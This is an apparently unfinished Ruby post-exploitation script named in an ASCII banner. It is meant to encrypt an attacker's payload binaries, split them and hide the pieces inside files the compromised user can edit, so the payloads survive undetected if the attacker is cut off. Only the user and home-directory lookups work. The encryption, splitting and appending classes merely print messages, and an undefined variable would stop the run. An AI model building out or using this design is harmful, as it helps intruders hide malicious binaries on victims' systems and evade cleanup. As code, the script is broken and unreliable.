##########################################################################################
#             .---.   ,---,                                                              #
#            /. ./| ,--.' |       ,--,                 ,-.----.                          #
#        .--'.  ' ; |  |  :     ,--.'|                 \    /  \               __  ,-.   #
#       /__./ \ : | :  :  :     |  |,       .--.--.    |   :    |            ,' ,'/ /|   #
#   .--'.  '   \' . :  |  |,--. `--'_      /  /    '   |   | .\ :    ,---.   '  | |' |   #
#  /___/ \ |    ' ' |  :  '   | ,' ,'|    |  :  /`./   .   : |: |   /     \  |  |   ,'   #
#  ;   \  \;      : |  |   /' : '  | |    |  :  ;_     |   |  \ :  /    /  | '  :  /     #
#   \   ;  `      | '  :  | | | |  | :     \  \    `.  |   : .  | .    ' / | |  | '      #
#    .   \    .\  ; |  |  ' | : '  : |__    `----.   \ :     |`-' '   ;   /| ;  : |      #
#     \   \   ' \ | |  :  :_:,' |  | '.'|  /  /`--'  / :   : :    '   |  / | |  , ;      #
#      :   '  |--"  |  | ,'     ;  :    ; '--'.     /  |   | :    |   :    |  ---'       #
#       \   \ ;     `--''       |  ,   /    `--'---'   `---'.|     \   \  /              #
#        '---"                   ---`-'                  `---`      `----'               #
# v1.0                                                                                   #
##########################################################################################
# Adonay Pichardo

# Post-Exploitation script to encrypt and copy payload-binaries into other directories
# to avoid leaving payload-binaries unencrypted, centralized, and exposed, should attacker
# become disconnected from target machine.

# 1. Get curent user
# 2. Get list of files current user has edit privileges for
# 3. Begin encrypting payload-binaries
# 4. Splice encrypted payload-binaries into smaller files
# 5. Append encrypted splices to editable files

require 'etc'

class User
    attr_reader :username
    def initialize
        @username = "noneSet"
    end

    def whoami
        puts "Getting current user..."
        @username = Etc.getlogin
    end
end

class Files
    attr_reader :fileList
    def initialize(currentUser)
        puts "Getting editable files..."
        @fileList = Dir.home(currentUser)
    end
end

class Encryptor
    def initialize(payloadBinary)
        puts "Encrypting file..."
    end
end

class Splitter
    def initialize(fullBinary)
        puts "Splitting file..."
    end
end

class Appender
    def initialize(files, pieces)
        puts "Appending pieces into files..."
    end
end

###############
# 1. Get curent user
###############
user = User.new()
user.whoami
puts user.username

###############
# 2. Get list of files current user has edit privileges for
###############
files = Files.new(user.username)

###############
# 3. Begin encrypting payload-binaries
###############

encrypted = Encryptor.new(payloadBinary)

###############
# 4. Splice encrypted payload-binaries into smaller files
###############
pieces = Splitter.new(encrypted)

###############
# 5. Append encrypted splices to editable files
###############
whispers = Appender.new(files, pieces)
